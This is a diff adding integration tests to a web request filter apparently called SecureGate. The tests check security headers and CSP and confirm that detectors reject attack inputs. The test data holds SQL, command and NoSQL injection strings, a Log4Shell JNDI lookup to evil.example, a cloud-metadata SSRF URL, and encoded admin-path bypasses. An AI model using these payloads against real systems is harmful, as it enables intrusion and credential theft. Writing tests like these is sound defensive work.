@@ -195,6 +195,78 @@ class SecureGateIntegrationTest {
                         .string(containsString("SecureGate Console")));
     }
 
+    @Test
+    void securityHeadersAreSetOnNormalAndBlockedResponses() throws Exception {
+        mvc.perform(get("/api/search").queryParam("q", "laptop").with(ip("10.0.8.1")))
+                .andExpect(status().isOk())
+                .andExpect(header().string("X-Content-Type-Options", "nosniff"))
+                .andExpect(header().string("X-Frame-Options", "DENY"))
+                .andExpect(header().string("Referrer-Policy", "no-referrer"))
+                .andExpect(header().exists("Permissions-Policy"))
+                .andExpect(header().string("Cross-Origin-Opener-Policy", "same-origin"))
+                .andExpect(header().doesNotExist("Strict-Transport-Security"))   // plain HTTP
+                .andExpect(header().doesNotExist("Content-Security-Policy"));     // app CSP is opt-in
+        mvc.perform(get("/api/search").queryParam("q", "' OR 1=1 --").with(ip("10.0.8.1")))
+                .andExpect(status().isBadRequest())
+                .andExpect(header().string("X-Content-Type-Options", "nosniff"))
+                .andExpect(header().string("X-Frame-Options", "DENY"));
+    }
+
+    @Test
+    void hstsIsSentOnlyOverHttps() throws Exception {
+        mvc.perform(get("/api/search").queryParam("q", "x").with(ip("10.0.8.2")).with(r -> {
+                    r.setSecure(true);
+                    return r;
+                }))
+                .andExpect(status().isOk())
+                .andExpect(header().string("Strict-Transport-Security", containsString("max-age=31536000")));
+    }
+
+    @Test
+    void ownPagesGetAStrictContentSecurityPolicy() throws Exception {
+        mvc.perform(get("/dashboard/index.html").with(ip("10.0.8.3")))
+                .andExpect(status().isOk())
+                .andExpect(header().string("Content-Security-Policy", containsString("default-src 'self'")))
+                .andExpect(header().string("Content-Security-Policy", containsString("frame-ancestors 'none'")))
+                .andExpect(header().string("Cache-Control", "no-store"));
+        mvc.perform(admin(get("/admin/config")).with(ip("10.0.8.3")))
+                .andExpect(header().string("Content-Security-Policy", containsString("default-src 'self'")));
+    }
+
+    @Test
+    void dashboardHasNoInlineScriptOrStyleSoTheCspCanBeStrict() throws Exception {
+        String html = mvc.perform(get("/dashboard/index.html").with(ip("10.0.8.4")))
+                .andExpect(status().isOk()).andReturn().getResponse().getContentAsString();
+        assertThat(html).doesNotContainPattern("<script(?![^>]*\\ssrc=)")
+                .doesNotContainPattern("<style")
+                .doesNotContainPattern("\\sstyle=\"")
+                .doesNotContainPattern("\\son[a-z]+=\"");
+        mvc.perform(get("/dashboard/app.js").with(ip("10.0.8.4"))).andExpect(status().isOk());
+        mvc.perform(get("/dashboard/style.css").with(ip("10.0.8.4"))).andExpect(status().isOk());
+    }
+
+    @Test
+    void newDetectorsAreActiveInTheFilterChain() throws Exception {
+        mvc.perform(get("/api/search").queryParam("q", "laptop; whoami").with(ip("10.0.8.5")))
+                .andExpect(status().isBadRequest()).andExpect(jsonPath("$.reason").value("Command injection detected"));
+        mvc.perform(get("/api/search").queryParam("q", "${jndi:ldap://evil.example/a}").with(ip("10.0.8.5")))
+                .andExpect(status().isBadRequest()).andExpect(jsonPath("$.reason").value("Log4Shell (JNDI) injection detected"));
+        mvc.perform(get("/api/search").queryParam("q", "http://169.254.169.254/latest/meta-data/").with(ip("10.0.8.6")))
+                .andExpect(status().isBadRequest()).andExpect(jsonPath("$.reason").value("SSRF detected"));
+        mvc.perform(post("/api/comment").contentType(MediaType.APPLICATION_JSON)
+                        .content("{\"text\":{\"$ne\":null}}").with(ip("10.0.8.7")))
+                .andExpect(status().isBadRequest()).andExpect(jsonPath("$.reason").value("NoSQL injection detected"));
+    }
+
+    @Test
+    void ssrfDetectorDoesNotFlagBrowserOriginAndRefererHeaders() throws Exception {
+        mvc.perform(get("/api/search").queryParam("q", "laptop")
+                        .header("Origin", "http://localhost:5173")
+                        .header("Referer", "http://127.0.0.1:8080/dashboard/")
+                        .with(ip("10.0.8.8")))
+                .andExpect(status().isOk());
+    }
+
     /** Regression: these raw paths used to skip the token check while still routing to /admin/config. */
     @ParameterizedTest
     @ValueSource(strings = {"/%61dmin/config", "/admin;x=1/config", "/ADMIN/config", "/admin//config",
